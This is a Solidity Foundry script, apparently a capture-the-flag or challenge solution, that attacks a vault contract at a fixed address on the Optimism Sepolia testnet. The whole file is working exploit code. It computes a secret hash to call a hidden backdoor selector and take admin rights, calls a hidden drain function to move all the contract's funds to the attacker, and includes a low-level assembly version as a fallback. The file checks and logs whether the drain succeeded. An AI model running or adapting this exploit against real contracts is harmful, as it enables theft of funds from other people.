// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Script.sol";
import "forge-std/console.sol";

/**
 * @title DrainVault Attack Script 
 * 
 * NOTE: This was the first way I found.
 * 
 * The intended attack steps were:
 * 1. Call hidden function 0xcffd46dc with correct hash to gain admin privileges
 * 2. Call hidden drain function 0xb70b232d to transfer all funds
 * 
 * Target Contract: 0xEF8433eC69ACc8B58522cDbbB899172ae62af4AC
 * Network: Optimism Sepolia
 */
contract DrainVaultScript is Script {
    // Target contract address on Optimism Sepolia
    address constant TARGET_CONTRACT = 0xEF8433eC69ACc8B58522cDbbB899172ae62af4AC;
    
    // Function selectors discovered through bytecode analysis
    bytes4 constant BACKDOOR_SELECTOR = 0xcffd46dc;  // Hidden admin backdoor
    bytes4 constant DRAIN_SELECTOR = 0xb70b232d;     // Hidden drain function
    
    function run() external {
        // Get private key from environment
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        address attacker = vm.addr(deployerPrivateKey);
        
        console.log("=== Drain Vault Attack ===");
        console.log("Target Contract:", TARGET_CONTRACT);
        console.log("Attacker Address:", attacker);
        console.log("Current Block Number:", block.number);
        
        // Check initial contract balance
        uint256 initialBalance = TARGET_CONTRACT.balance;
        console.log("Target Contract Balance:", initialBalance, "wei");
        
        if (initialBalance == 0) {
            console.log("Contract is already empty!");
            return;
        }
        
        vm.startBroadcast(deployerPrivateKey);
        
        // Step 1: Gain admin access using the backdoor
        bool adminGranted = gainAdminAccess(attacker);
        
        if (!adminGranted) {
            console.log("Failed to gain admin access. Retrying...");
            // Try again with updated block number
            adminGranted = gainAdminAccess(attacker);
        }
        
        require(adminGranted, "Failed to gain admin access after retry");
        console.log("Successfully gained admin access!");
        
        // Step 2: Drain the vault
        drainVault();
        
        vm.stopBroadcast();
        
        // Verify the attack was successful
        uint256 finalBalance = TARGET_CONTRACT.balance;
        console.log("Final Contract Balance:", finalBalance, "wei");
        console.log("Attacker Balance Increase:", attacker.balance, "wei");
        
        if (finalBalance == 0) {
            console.log("SUCCESS: Contract successfully drained!");
        } else {
            console.log("FAILED: Contract still has funds");
        }
    }
    
    /**
     * @dev Step 1: Gain admin access through the hidden backdoor
     * @param attacker The address that will become admin
     * @return success Whether admin access was granted
     */
    function gainAdminAccess(address attacker) internal returns (bool success) {
        // Calculate the required hash: keccak256("drain", msg.sender, block.number)
        bytes32 secretHash = keccak256(abi.encode("drain", attacker, block.number));
        
        console.log("Calculated secret hash for block", block.number, ":");
        console.logBytes32(secretHash);
        
        // Call the backdoor function with the secret hash
        (bool callSuccess,) = TARGET_CONTRACT.call(
            abi.encodeWithSelector(BACKDOOR_SELECTOR, uint256(secretHash))
        );
        
        if (callSuccess) {
            console.log("Backdoor function call successful");
        } else {
            console.log("Backdoor function call failed");
        }
        
        return callSuccess;
    }
    
    /**
     * @dev Step 2: Drain the vault using the hidden drain function
     */
    function drainVault() internal {
        console.log("Calling drain function...");
        
        // Call the hidden drain function
        (bool success,) = TARGET_CONTRACT.call(
            abi.encodeWithSelector(DRAIN_SELECTOR)
        );
        
        require(success, "Drain function call failed");
        console.log("Drain function executed successfully!");
    }
    
    /**
     * @dev Alternative method: Use low-level assembly for direct calls
     * This can be useful if the above methods fail due to gas or other issues
     */
    function alternativeAttack(address attacker) external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployerPrivateKey);
        
        // Method 1: Direct assembly call for backdoor
        bytes32 hash = keccak256(abi.encodePacked("drain", attacker, block.number));
        
        assembly {
            let ptr := mload(0x40)
            mstore(ptr, 0xcffd46dc00000000000000000000000000000000000000000000000000000000)
            mstore(add(ptr, 0x04), hash)
            
            let success := call(gas(), TARGET_CONTRACT, 0, ptr, 0x24, 0, 0)
            if iszero(success) { revert(0, 0) }
        }
        
        // Method 2: Direct assembly call for drain
        assembly {
            let ptr := mload(0x40)
            mstore(ptr, 0xb70b232d00000000000000000000000000000000000000000000000000000000)
            
            let success := call(gas(), TARGET_CONTRACT, 0, ptr, 0x04, 0, 0)
            if iszero(success) { revert(0, 0) }
        }
        
        vm.stopBroadcast();
    }
}
